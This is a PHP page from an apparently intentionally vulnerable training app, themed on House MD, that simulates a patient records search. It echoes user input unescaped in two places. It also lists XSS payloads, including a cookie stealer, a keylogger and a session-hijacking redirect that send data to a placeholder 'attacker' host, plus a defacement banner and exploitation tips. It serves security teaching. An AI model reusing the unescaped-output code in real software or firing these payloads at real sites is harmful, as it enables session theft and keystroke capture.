<?php
// patient_search.php - Enhanced XSS Vulnerability
require_once 'includes.php';

echo get_header("Patient Search", "Everybody lies. The question is, about what?");

// Simulated patient database
$patients = [
    ["id" => 1, "name" => "Rachel Dunne", "diagnosis" => "Sarcoidosis"],
    ["id" => 2, "name" => "Harvey Park", "diagnosis" => "Amyloidosis"],
    ["id" => 3, "name" => "Victoria Madsen", "diagnosis" => "Lupus"],
    ["id" => 4, "name" => "Ethan Hodges", "diagnosis" => "Vasculitis"]
];

$searchTerm = $_GET['search'] ?? '';

echo <<<HTML
    <div class="panel">
        <h2>Patient Records Search</h2>
        <form method="GET">
            <div class="form-group">
                <input type="text" name="search" placeholder="Enter patient name" value="$searchTerm">
                <button type="submit">Search</button>
            </div>
        </form>
HTML;

if ($searchTerm) {
    echo '<div class="results">';
    echo "<h3>Search Results for: " . htmlspecialchars($searchTerm) . "</h3>";
    
    $found = false;
    foreach ($patients as $patient) {
        // Case-insensitive search (vulnerable to XSS in diagnosis)
        if (stripos($patient['name'], $searchTerm) !== false) {
            // Intentionally vulnerable to XSS in diagnosis field
            echo "<div class='patient-card'>";
            echo "<h4>{$patient['name']}</h4>";
            echo "<p><strong>Diagnosis:</strong> {$patient['diagnosis']}</p>";
            echo "</div>";
            $found = true;
        }
    }
    
    if (!$found) {
        // Intentionally vulnerable to XSS in error message
        echo "<div class='error-message'>";
        echo "<p>No records found for: <strong>$searchTerm</strong></p>";
        echo "</div>";
    }
    
    echo '</div>';
}

echo <<<HTML
    <div class="vuln-section">
        <h3>XSS Vulnerability</h3>
        <p>This search form is vulnerable to Cross-Site Scripting (XSS) attacks.</p>
        
        <div class="xss-payloads">
            <h4>Try these payloads:</h4>
            
            <div class="payload">
                <h5>Simple Alert</h5>
                <code>&lt;script&gt;alert('House MD XSS')&lt;/script&gt;</code>
                <p>Basic proof of concept</p>
            </div>
            
            <div class="payload">
                <h5>Session Stealer</h5>
                <code>&lt;script&gt;fetch('http://attacker/?cookie='+document.cookie)&lt;/script&gt;</code>
                <p>Steals session cookies</p>
            </div>
            
            <div class="payload">
                <h5>Keylogger</h5>
                <code>&lt;script&gt;document.onkeypress=function(e){fetch('http://attacker/?key='+e.key)}&lt;/script&gt;</code>
                <p>Logs all keystrokes</p>
            </div>
            
            <div class="payload">
                <h5>Defacement</h5>
                <code>&lt;div style="position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;z-index:9999"&gt;HACKED BY HOUSE MD TEAM&lt;/div&gt;</code>
                <p>Shows a persistent banner</p>
            </div>
            
            <div class="payload">
                <h5>Session Hijacking</h5>
                <code>&lt;script&gt;document.location='http://attacker/steal.php?cookie='+document.cookie&lt;/script&gt;</code>
                <p>Redirects to attacker with session</p>
            </div>
        </div>
        
        <div class="xss-tips">
            <h4>Tips for Successful Exploitation:</h4>
            <ul>
                <li>Use payloads in the search field</li>
                <li>Try both the error message and diagnosis fields</li>
                <li>For persistent effects, use the defacement payload</li>
                <li>To test without breaking layout, use the alert payload</li>
            </ul>
        </div>
    </div>
HTML;

echo '</div>'; // Close panel
echo get_footer();
?>